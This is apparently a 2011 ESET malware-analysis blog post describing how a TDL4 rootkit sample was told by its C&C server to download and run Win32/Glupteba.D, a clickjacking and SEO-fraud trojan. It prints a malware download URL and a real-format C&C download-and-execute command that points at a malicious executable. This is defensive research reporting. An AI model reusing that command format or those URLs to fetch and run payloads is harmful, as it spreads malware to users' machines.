This was the first instance he’d come across of\nTDL4 used to install other malware, and here’s his account of what he found.\n\nA sample of Win32/Olmarik.AOV was obtained from the URL\nhxxp://vidquick.info/cgi/icpcom.exe. After what looked like a standard TDL4 installation, at\nany rate in accordance with the most recent versions analysed, Win32/Olmarik.AOV\nreceived a command from the C&C server to download and execute another binary file.\n\nThe C&C command looks like this:\n\ntask_id = 2|10||http://wheelcars.ru/no.exe [Win32/Glupteba.D]\n\nCommands are formatted like this:\n\ntask_id = <command_id><encryption_key><URL>\n\nIn this particular case, the command ID coincides with “DownloadAndExecute”, because the\nencryption key is null and the command id is 2 followed by 10.\n\nWin32/Glupteba.D uses blackhat SEO methods for to push clickjacking contextual\n[advertising used by the ads network Begun (http://www.begun.ru/), which has a high profile](http://www.begun.ru/)\nin Russia. Clickjacking algorithms have been developed for crawling web-sites pushing\n\n\n-----\n\ntypical content for specified context ads. All affected web-sites are hosted by a single\nprovider: “Masterhost.ru” is, in fact, the biggest Russian hosting-provider.\n\nNetwork activity from Win32/Glupteba.D is\nshown in the following screendump:\n\nCommands for Win32/Glupteba.D to C&C\nlook like this:\n\nThis is not a plugin for TDL4: it’s standalone\nmalware, which can download and execute\nother binary modules independently.\nWin32/Glupteba.D is not integrated into TDL4\nfunctionality.\n\n**David Harley, ESET Senior Research**\n**Fellow**\n**Aleksandr Matrosov, Senior Malware**\n**Rsearcher**\n\n2 Mar 2011 - 12:21PM\n\n## Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
